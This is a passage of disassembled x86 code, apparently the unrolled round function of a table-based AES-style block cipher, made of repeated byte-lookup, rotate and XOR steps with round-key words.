xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xd0 ]
mov [ esp + 0x18 ] edx
movzx eax [ esp + 0xc ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x8 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xd4 ]
mov [ esp + 0x1c ] edx
movzx eax [ esp + 0x10 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0xc ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xd8 ]
mov [ esp + 0x20 ] edx
movzx eax [ esp + 0x14 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x10 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xdc ]
mov [ esp + 0x24 ] edx
movzx eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xc0 ]
mov [ esp + 0x8 ] edx
movzx eax [ esp + 0x1c ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x18 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xc4 ]
mov [ esp + 0xc ] edx
movzx eax [ esp + 0x20 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x1c ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xc8 ]
mov [ esp + 0x10 ] edx
movzx eax [ esp + 0x24 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x20 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xcc ]
mov [ esp + 0x14 ] edx
movzx eax [ esp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x14 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xb0 ]
mov [ esp + 0x18 ] edx
movzx eax [ esp + 0xc ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x8 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xb4 ]
mov [ esp + 0x1c ] edx
movzx eax [ esp + 0x10 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0xc ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xb8 ]
mov [ esp + 0x20 ] edx
movzx eax [ esp + 0x14 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x10 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xbc ]
mov [ esp + 0x24 ] edx
movzx eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xa0 ]
mov [ esp + 0x8 ] edx
movzx eax [ esp + 0x1c ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x18 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xa4 ]
mov [ esp + 0xc ] edx
movzx eax [ esp + 0x20 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x1c ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xa8 ]
mov [ esp + 0x10 ] edx
movzx eax [ esp + 0x24 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x20 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xac ]
mov [ esp + 0x14 ] edx
movzx eax [ esp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x14 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x90 ]
mov [ esp + 0x18 ] edx
movzx eax [ esp + 0xc ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x8 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x94 ]
mov [ esp + 0x1c ] edx
movzx eax [ esp + 0x10 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0xc ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x98 ]
mov [ esp + 0x20 ] edx
movzx eax [ esp + 0x14 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x10 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x9c ]
mov [ esp + 0x24 ] edx
movzx eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x80 ]
mov [ esp + 0x8 ] edx
movzx eax [ esp + 0x1c ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x18 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x84 ]
mov [ esp + 0xc ] edx
movzx eax [ esp + 0x20 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x1c ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x88 ]
mov [ esp + 0x10 ] edx
movzx eax [ esp + 0x24 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x20 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x8c ]
mov [ esp + 0x14 ] edx
movzx eax [ esp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x14 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x70 ]
mov [ esp + 0x18 ] edx
movzx eax [ esp + 0xc ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x8 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x74 ]
mov [ esp + 0x1c ] edx
movzx eax [ esp + 0x10 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0xc ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x78 ]
mov [ esp + 0x20 ] edx
movzx eax [ esp + 0x14 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x10 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x7c ]
mov [ esp + 0x24 ] edx
movzx eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x60 ]
mov [ esp + 0x8 ] edx
movzx eax [ esp + 0x1c ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x18 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x64 ]
mov [ esp + 0xc ] edx
movzx eax [ esp + 0x20 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x1c ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x68 ]
mov [ esp + 0x10 ] edx
movzx eax [ esp + 0x24 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x20 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x6c ]
mov [ esp + 0x14 ] edx
movzx eax [ esp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x14 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x50 ]
mov [ esp + 0x18 ] edx
movzx eax [ esp + 0xc ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x8 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x54 ]
mov [ esp + 0x1c ] edx
movzx eax [ esp + 0x10 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0xc ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x58 ]
mov [ esp + 0x20 ] edx
movzx eax [ esp + 0x14 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x10 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x5c ]
mov [ esp + 0x24 ] edx
movzx eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x40 ]
mov [ esp + 0x8 ] edx
movzx eax [ esp + 0x1c ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x18 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x44 ]
mov [ esp + 0xc ] edx
movzx eax [ esp + 0x20 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x1c ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x48 ]
mov [ esp + 0x10 ] edx
movzx eax [ esp + 0x24 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x20 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x4c ]
mov [ esp + 0x14 ] edx
movzx eax [ esp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x14 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x30 ]
mov [ esp + 0x18 ] edx
